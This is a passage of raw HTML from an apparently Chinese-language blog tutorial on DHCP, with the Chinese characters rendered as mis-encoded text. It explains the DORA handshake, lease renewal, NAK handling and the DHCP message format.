class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs armasm">åœºæ™¯<span class="hljs-number">1</span>ï¼šå…¬å¸æœ‰<span class="hljs-number">100</span>å°ç”µè„‘<br>âŒ æ‰‹åŠ¨é…ç½®æ¯å°ç”µè„‘çš„<span class="hljs-built_in">IP</span>åœ°å€<br>âŒ è®°å½•å“ªäº›<span class="hljs-built_in">IP</span>å·²è¢«ä½¿ç”¨<br>âŒ é¿å…<span class="hljs-built_in">IP</span>åœ°å€å†²çª<br>âŒ æ–°å‘˜å·¥å…¥èŒéœ€è¦ITæ‰‹åŠ¨é…ç½®<br>âŒ å‘˜å·¥ç¦»èŒéœ€è¦æ‰‹åŠ¨å›æ”¶<span class="hljs-built_in">IP</span><br><br>æ—¶é—´æˆæœ¬ï¼šæ¯å°çº¦<span class="hljs-number">10</span>åˆ†é’Ÿ Ã— <span class="hljs-number">100</span>å° = <span class="hljs-number">1000</span>åˆ†é’Ÿ<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨DHCPçš„å¥½å¤„</strong>ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs armasm">åœºæ™¯<span class="hljs-number">2</span>ï¼šé…ç½®DHCPæœåŠ¡å™¨<br>âœ… ç”µè„‘å¼€æœºè‡ªåŠ¨è·å–<span class="hljs-built_in">IP</span><br>âœ… æ— éœ€äººå·¥å¹²é¢„<br>âœ… è‡ªåŠ¨é¿å…<span class="hljs-built_in">IP</span>å†²çª<br>âœ… æ–°è®¾å¤‡å³æ’å³ç”¨<br>âœ… ç¦»çº¿è®¾å¤‡è‡ªåŠ¨å›æ”¶<span class="hljs-built_in">IP</span><br><br>æ—¶é—´æˆæœ¬ï¼šé…ç½®ä¸€æ¬¡DHCPæœåŠ¡å™¨ â‰ˆ <span class="hljs-number">30</span>åˆ†é’Ÿ<br></code></pre></td></tr></table></figure><h3 id="1-3-DHCPèƒ½é…ç½®ä»€ä¹ˆï¼Ÿ">1.3 DHCPèƒ½é…ç½®ä»€ä¹ˆï¼Ÿ</h3><p>DHCPä¸ä»…åˆ†é…IPåœ°å€ï¼Œè¿˜ä¼šé…ç½®ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> IPåœ°å€           192.168.1.100<br><span class="hljs-bullet">2.</span> å­ç½‘æ©ç          255.255.255.0<br><span class="hljs-bullet">3.</span> é»˜è®¤ç½‘å…³         192.168.1.1<br><span class="hljs-bullet">4.</span> DNSæœåŠ¡å™¨        8.8.8.8, 114.114.114.114<br><span class="hljs-bullet">5.</span> ç§Ÿçº¦æ—¶é—´         24å°æ—¶<br><span class="hljs-bullet">6.</span> WINSæœåŠ¡å™¨       ï¼ˆå¯é€‰ï¼‰<br><span class="hljs-bullet">7.</span> åŸŸå             example.com<br><span class="hljs-bullet">8.</span> NTPæ—¶é—´æœåŠ¡å™¨    ï¼ˆå¯é€‰ï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="2-DHCPå·¥ä½œåŸç†">2. DHCPå·¥ä½œåŸç†</h2><h3 id="2-1-DHCPå››æ¬¡æ¡æ‰‹ï¼ˆDORAè¿‡ç¨‹ï¼‰">2.1 DHCPå››æ¬¡æ¡æ‰‹ï¼ˆDORAè¿‡ç¨‹ï¼‰</h3><p>DHCPè·å–IPåœ°å€éœ€è¦å››ä¸ªæ­¥éª¤ï¼Œç§°ä¸º<strong>DORAè¿‡ç¨‹</strong>ï¼š</p><ol><li><strong>D</strong>iscover - å‘ç°æœåŠ¡å™¨</li><li><strong>O</strong>ffer - æä¾›åœ°å€</li><li><strong>R</strong>equest - è¯·æ±‚åœ°å€</li><li><strong>A</strong>ck - ç¡®è®¤åˆ†é…</li></ol><p><strong>å®Œæ•´æµç¨‹å›¾</strong>ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">å®¢æˆ·ç«¯                                    DHCPæœåŠ¡å™¨<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">  1. DHCP Discover (å¹¿æ’­)                 </span>|<br>  |<span class="hljs-string">  &quot;æœ‰DHCPæœåŠ¡å™¨å—ï¼Ÿæˆ‘éœ€è¦IPåœ°å€&quot;           </span>|<br>  |<span class="hljs-string">------------------------------------------&gt;</span>|<br>  |<span class="hljs-string">     æºIP: 0.0.0.0                         </span>|<br>  |<span class="hljs-string">     ç›®æ ‡IP: 255.255.255.255               </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">                                           </span>|<span class="hljs-string"> æ£€æŸ¥å¯ç”¨IP</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                           </span>|<span class="hljs-string"> æ‰¾åˆ°: 192.168.1.100</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">  2. DHCP Offer (å•æ’­/å¹¿æ’­)                </span>|<br>  |<span class="hljs-string">  &quot;æˆ‘è¿™é‡Œæœ‰ä¸ªIPï¼š192.168.1.100&quot;            </span>|<br>  |<span class="hljs-string">&lt;------------------------------------------</span>|<br>  |<span class="hljs-string">     æºIP: 192.168.1.1                     </span>|<br>  |<span class="hljs-string">     æä¾›IP: 192.168.1.100                 </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string"> å†³å®šæ¥å—è¿™ä¸ªIP                             </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">  3. DHCP Request (å¹¿æ’­)                   </span>|<br>  |<span class="hljs-string">  &quot;æˆ‘è¦192.168.1.100è¿™ä¸ªIP&quot;                </span>|<br>  |<span class="hljs-string">------------------------------------------&gt;</span>|<br>  |<span class="hljs-string">     è¯·æ±‚IP: 192.168.1.100                 </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">                                           </span>|<span class="hljs-string"> ç¡®è®¤IPå¯ç”¨</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                           </span>|<span class="hljs-string"> æ ‡è®°ä¸ºå·²åˆ†é…</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">  4. DHCP Ack (å•æ’­)                       </span>|<br>  |<span class="hljs-string">  &quot;å¥½çš„ï¼Œ192.168.1.100å½’ä½ äº†ï¼Œç§ŸæœŸ24å°æ—¶&quot;   </span>|<br>  |<span class="hljs-string">&lt;------------------------------------------</span>|<br>  |<span class="hljs-string">     ç¡®è®¤IP: 192.168.1.100                 </span>|<br>  |<span class="hljs-string">     ç§ŸæœŸ: 86400ç§’                          </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string"> âœ… é…ç½®IPåœ°å€                              </span>|<br>  |<span class="hljs-string"> âœ… å¯ä»¥ä¸Šç½‘äº†                              </span>|<br>  |<span class="hljs-string">                                           </span>|<br></code></pre></td></tr></table></figure><h3 id="2-2-è¯¦ç»†æ­¥éª¤è§£æ">2.2 è¯¦ç»†æ­¥éª¤è§£æ</h3><p><strong>æ­¥éª¤1ï¼šDHCP Discoverï¼ˆå‘ç°ï¼‰</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">å®¢æˆ·ç«¯åˆšå¼€æœºï¼Œè¿˜æ²¡æœ‰<span class="hljs-built_in">IP</span>åœ°å€<br><br>å¹¿æ’­æ¶ˆæ¯ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æºMACï¼š  aa:bb:cc:<span class="hljs-built_in">dd</span>:ee:ff    â”‚<br>â”‚ ç›®æ ‡MACï¼šff:ff:ff:ff:ff:ff    â”‚ (å¹¿æ’­)<br>â”‚ æº<span class="hljs-built_in">IP</span>ï¼š   <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>               â”‚ (è¿˜æ²¡æœ‰<span class="hljs-built_in">IP</span>)<br>â”‚ ç›®æ ‡<span class="hljs-built_in">IP</span>ï¼š <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span>       â”‚ (å¹¿æ’­)<br>â”‚ æ¶ˆæ¯ï¼š   æˆ‘éœ€è¦<span class="hljs-built_in">IP</span>åœ°å€ï¼         â”‚<br>â”‚ äº‹åŠ¡IDï¼š <span class="hljs-number">0x12345678</span>            â”‚ (ç”¨äºåŒ¹é…å“åº”)<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç‰¹ç‚¹ï¼š<br>- ä½¿ç”¨å¹¿æ’­ï¼Œå› ä¸ºä¸çŸ¥é“DHCPæœåŠ¡å™¨åœ¨å“ª<br>- æº<span class="hljs-built_in">IP</span>æ˜¯<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>ï¼Œå› ä¸ºè¿˜æ²¡æœ‰<span class="hljs-built_in">IP</span>åœ°å€<br>- åŒ…å«å®¢æˆ·ç«¯çš„MACåœ°å€ï¼ˆç”¨äºè¯†åˆ«ï¼‰<br></code></pre></td></tr></table></figure><p><strong>æ­¥éª¤2ï¼šDHCP Offerï¼ˆæä¾›ï¼‰</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dns">æœåŠ¡å™¨æ”¶åˆ°Discoveråï¼Œä»åœ°å€æ± ä¸­é€‰æ‹©ä¸€ä¸ªå¯ç”¨IP<br><br>å•æ’­/å¹¿æ’­å“åº”ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æºIPï¼š   <span class="hljs-number">192.168.1.1</span> (DHCPæœåŠ¡å™¨) â”‚<br>â”‚ ç›®æ ‡IPï¼š <span class="hljs-number">192.168.1.100</span> æˆ– å¹¿æ’­   â”‚<br>â”‚ æä¾›IPï¼š <span class="hljs-number">192.168.1.100</span>          â”‚<br>â”‚ å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.255.0</span>         â”‚<br>â”‚ é»˜è®¤ç½‘å…³ï¼š<span class="hljs-number">192.168.1.1</span>           â”‚<br>â”‚ DNSï¼š    <span class="hljs-number">8.8.8.8</span>                â”‚<br>â”‚ ç§ŸæœŸï¼š   <span class="hljs-number">86400</span>ç§’ (<span class="hljs-number">24</span>å°æ—¶)       â”‚<br>â”‚ äº‹åŠ¡IDï¼š <span class="hljs-number">0x12345678</span> (åŒ¹é…è¯·æ±‚)  â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç‰¹ç‚¹ï¼š<br>- å¯èƒ½æœ‰å¤šä¸ªDHCPæœåŠ¡å™¨å“åº”<br>- æä¾›IPä½†è¿˜æ²¡æœ‰åˆ†é…<br>- å®¢æˆ·ç«¯å¯ä»¥é€‰æ‹©æ¥å—å“ªä¸ªoffer<br></code></pre></td></tr></table></figure><p><strong>æ­¥éª¤3ï¼šDHCP Requestï¼ˆè¯·æ±‚ï¼‰</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs armasm">å®¢æˆ·ç«¯é€‰æ‹©ä¸€ä¸ªofferï¼Œæ­£å¼è¯·æ±‚è¯¥<span class="hljs-built_in">IP</span><br><br>å¹¿æ’­æ¶ˆæ¯ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æº<span class="hljs-built_in">IP</span>ï¼š   <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>               â”‚ (ä»ç„¶æ²¡æœ‰<span class="hljs-built_in">IP</span>)<br>â”‚ ç›®æ ‡<span class="hljs-built_in">IP</span>ï¼š <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>       â”‚ (å¹¿æ’­)<br>â”‚ è¯·æ±‚<span class="hljs-built_in">IP</span>ï¼š <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span>         â”‚<br>â”‚ æœåŠ¡å™¨ï¼š <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>           â”‚<br>â”‚ æ¶ˆæ¯ï¼š   æˆ‘è¦è¿™ä¸ª<span class="hljs-built_in">IP</span>ï¼           â”‚<br>â”‚ äº‹åŠ¡IDï¼š <span class="hljs-number">0x12345678</span>            â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ä¸ºä»€ä¹ˆå¹¿æ’­ï¼Ÿ<br>- å‘Šè¯‰æ‰€æœ‰DHCPæœåŠ¡å™¨ï¼š<span class="hljs-string">&quot;æˆ‘é€‰æ‹©äº†192.168.1.1çš„offer&quot;</span><br>- å…¶ä»–æœåŠ¡å™¨å¯ä»¥å›æ”¶å®ƒä»¬æä¾›çš„<span class="hljs-built_in">IP</span><br></code></pre></td></tr></table></figure><p><strong>æ­¥éª¤4ï¼šDHCP Ackï¼ˆç¡®è®¤ï¼‰</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">æœåŠ¡å™¨ç¡®è®¤åˆ†é…ï¼Œå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨IPäº†<br><br>å•æ’­å“åº”ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æºIPï¼š   <span class="hljs-number">192.168.1.1</span>           â”‚<br>â”‚ ç›®æ ‡IPï¼š <span class="hljs-number">192.168.1.100</span>         â”‚<br>â”‚ ç¡®è®¤IPï¼š <span class="hljs-number">192.168.1.100</span>         â”‚<br>â”‚ ç§ŸæœŸï¼š   <span class="hljs-number">86400</span>ç§’               â”‚<br>â”‚ å¼€å§‹æ—¶é—´ï¼š<span class="hljs-number">2024-01-15</span> <span class="hljs-number">10</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>  â”‚<br>â”‚ æ›´æ–°æ—¶é—´ï¼š<span class="hljs-number">2024-01-15</span> <span class="hljs-number">22</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>  â”‚ (<span class="hljs-number">50</span>%ç§ŸæœŸ)<br>â”‚ é‡ç»‘æ—¶é—´ï¼š<span class="hljs-number">2024-01-16</span> <span class="hljs-number">04</span>:<span class="hljs-number">30</span>:<span class="hljs-number">00</span>  â”‚ (<span class="hljs-number">87</span>.<span class="hljs-number">5</span>%ç§ŸæœŸ)<br>â”‚ æ¶ˆæ¯ï¼š   åˆ†é…æˆåŠŸï¼             â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>å®¢æˆ·ç«¯æ”¶åˆ°Ackåï¼š<br>âœ… é…ç½®IPåœ°å€ï¼š<span class="hljs-number">192.168.1.100</span><br>âœ… é…ç½®å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.255.0</span><br>âœ… é…ç½®é»˜è®¤ç½‘å…³ï¼š<span class="hljs-number">192.168.1.1</span><br>âœ… é…ç½®DNSæœåŠ¡å™¨ï¼š<span class="hljs-number">8.8.8.8</span><br>âœ… å¯åŠ¨ç§Ÿçº¦è®¡æ—¶å™¨<br></code></pre></td></tr></table></figure><h3 id="2-3-ç‰¹æ®Šæƒ…å†µ">2.3 ç‰¹æ®Šæƒ…å†µ</h3><p><strong>æƒ…å†µ1ï¼šæœåŠ¡å™¨æ‹’ç»ï¼ˆDHCP Nakï¼‰</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs armasm">åŸå› ï¼š<br>- è¯·æ±‚çš„<span class="hljs-built_in">IP</span>å·²è¢«å…¶ä»–è®¾å¤‡å ç”¨<br>- <span class="hljs-built_in">IP</span>åœ°å€ä¸åœ¨åˆ†é…èŒƒå›´å†…<br>- ç§Ÿçº¦å·²è¿‡æœŸä¸”<span class="hljs-built_in">IP</span>è¢«é‡æ–°åˆ†é…<br><br>æµç¨‹ï¼š<br>å®¢æˆ·ç«¯ â†’ DHCP Request<br>æœåŠ¡å™¨ â†’ DHCP Nak (æ‹’ç»)<br>å®¢æˆ·ç«¯ â†’ é‡æ–°å¼€å§‹ï¼Œå‘é€ DHCP Discover<br></code></pre></td></tr></table></figure><p><strong>æƒ…å†µ2ï¼šç§Ÿçº¦ç»­æœŸ</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">æ—¶é—´çº¿ï¼ˆå‡è®¾ç§ŸæœŸ<span class="hljs-number">24</span>å°æ—¶ï¼‰ï¼š<br><br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>h        è·å¾—IPåœ°å€<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">12</span>h (<span class="hljs-number">50</span>%) å°è¯•ç»­æœŸï¼ˆç›´æ¥å‘åŸæœåŠ¡å™¨è¯·æ±‚ï¼‰<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">21</span>h (<span class="hljs-number">87.5</span>%) å¦‚æœç»­æœŸå¤±è´¥ï¼Œå¹¿æ’­ç»­æœŸè¯·æ±‚<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">24</span>h       ç§Ÿçº¦åˆ°æœŸï¼Œé‡Šæ”¾IPï¼Œé‡æ–°DORA<br><br>ç»­æœŸè¿‡ç¨‹ï¼ˆç®€åŒ–çš„DORAï¼‰ï¼š<br>å®¢æˆ·ç«¯ â†’ DHCP Request (ç»­æœŸè¯·æ±‚)<br>æœåŠ¡å™¨ â†’ DHCP Ack (åŒæ„ç»­æœŸ) æˆ– Nak (æ‹’ç»ï¼Œé‡æ–°DORA)<br></code></pre></td></tr></table></figure><p><strong>æƒ…å†µ3ï¼šå®¢æˆ·ç«¯é‡å¯</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs armasm">åœºæ™¯ï¼šå®¢æˆ·ç«¯è®°å¾—ä¸Šæ¬¡ä½¿ç”¨çš„<span class="hljs-built_in">IP</span><br><br>å¿«é€Ÿé‡è¿ï¼š<br>å®¢æˆ·ç«¯ â†’ DHCP Request (ç›´æ¥è¯·æ±‚ä¸Šæ¬¡çš„<span class="hljs-built_in">IP</span>)<br>        æº<span class="hljs-built_in">IP</span>: <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>        è¯·æ±‚<span class="hljs-built_in">IP</span>: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> (ä¸Šæ¬¡çš„)<br><br>æœåŠ¡å™¨ â†’ DHCP Ack (å¦‚æœ<span class="hljs-built_in">IP</span>ä»ç„¶å¯ç”¨)<br>     æˆ– DHCP Nak (<span class="hljs-built_in">IP</span>å·²è¢«å ç”¨ï¼Œé‡æ–°DORA)<br><br>ä¼˜ç‚¹ï¼š<br>- è·³è¿‡Discoverå’ŒOffer<br>- æ›´å¿«è·å¾—ç½‘ç»œè¿æ¥<br>- å‡å°‘ç½‘ç»œæµé‡<br></code></pre></td></tr></table></figure><hr><h2 id="3-DHCPæŠ¥æ–‡æ ¼å¼">3. DHCPæŠ¥æ–‡æ ¼å¼</h2><h3 id="3-1-DHCPæŠ¥æ–‡ç»“æ„">3.1 DHCPæŠ¥æ–‡ç»“æ„</h3><p>DHCPåŸºäº<strong>BOOTPåè®®</strong>ï¼Œä½¿ç”¨UDPä¼ è¾“ï¼š</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs erlang">UDPç«¯å£ï¼š<br>- å®¢æˆ·ç«¯ç«¯å£ï¼š68<br>- æœåŠ¡å™¨ç«¯å£ï¼š67<br><br>æŠ¥æ–‡æ ¼å¼ï¼ˆæœ€å°236å­—èŠ‚ï¼‰ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ Op <span class="hljs-params">(<span class="hljs-number">1</span>å­—èŠ‚)</span>         æ“ä½œç             â”‚ 1=è¯·æ±‚, 2=å“åº”<br>â”‚ HType <span class="hljs-params">(<span class="hljs-number">1</span>å­—èŠ‚)</span>      ç¡¬ä»¶ç±»å‹          â”‚ 1=ä»¥å¤ªç½‘<br>â”‚ HLen <span class="hljs-params">(<span class="hljs-number">1</span>å­—èŠ‚)</span>       ç¡¬ä»¶åœ°å€é•¿åº¦      â”‚ 6=MACåœ°å€<br>â”‚ Hops <span class="hljs-params">(<span class="hljs-number">1</span>å­—èŠ‚)</span>       è·³æ•°              â”‚ ä¸­ç»§è®¡æ•°<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Transaction ID <span class="hljs-params">(<span class="hljs-number">4</span>å­—èŠ‚)</span> äº‹åŠ¡ID        â”‚ éšæœºæ•°ï¼ŒåŒ¹é…è¯·æ±‚å’Œå“åº”<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Seconds <span class="hljs-params">(<span class="hljs-number">2</span>å­—èŠ‚)</span>    å¼€æœºç§’æ•°          â”‚ å®¢æˆ·ç«¯å¼€æœºåçš„ç§’æ•°<br>â”‚ Flags <span class="hljs-params">(<span class="hljs-number">2</span>å­—èŠ‚)</span>      æ ‡å¿—ä½            â”‚ å¹¿æ’­æ ‡å¿—ç­‰<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Client IP <span class="hljs-params">(<span class="hljs-number">4</span>å­—èŠ‚)</span>  å®¢æˆ·ç«¯IP          â”‚ ç»­æœŸæ—¶ä½¿ç”¨<br>â”‚ Your IP <span class="hljs-params">(<span class="hljs-number">4</span>å­—èŠ‚)</span>    ä½ çš„IP            â”‚ æœåŠ¡å™¨åˆ†é…çš„IP<br>â”‚ Server IP <span class="hljs-params">(<span class="hljs-number">4</span>å­—èŠ‚)</span>  æœåŠ¡å™¨IP          â”‚ DHCPæœåŠ¡å™¨åœ°å€<br>â”‚ Gateway IP <span class="hljs-params">(<span class="hljs-number">4</span>å­—èŠ‚)</span> ç½‘å…³IP            â”‚ ä¸­ç»§ä»£ç†åœ°å€<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Client MAC <span class="hljs-params">(<span class="hljs-number">16</span>å­—èŠ‚)</span> å®¢æˆ·ç«¯ç¡¬ä»¶åœ°å€   â”‚ å‰6å­—èŠ‚æ˜¯MAC<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Server Name <span class="hljs-params">(<span class="hljs-number">64</span>å­—èŠ‚)</span> æœåŠ¡å™¨åç§°      â”‚ å¯é€‰<br>â”‚ Boot File <span class="hljs-params">(<span class="hljs-number">128</span>å­—èŠ‚)</span>  å¯åŠ¨æ–‡ä»¶å      â”‚ å¯é€‰<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Magic Cookie <span class="hljs-params">(<span class="hljs-number">4</span>å­—èŠ‚)</span> é­”æœ¯å­—          â”‚ 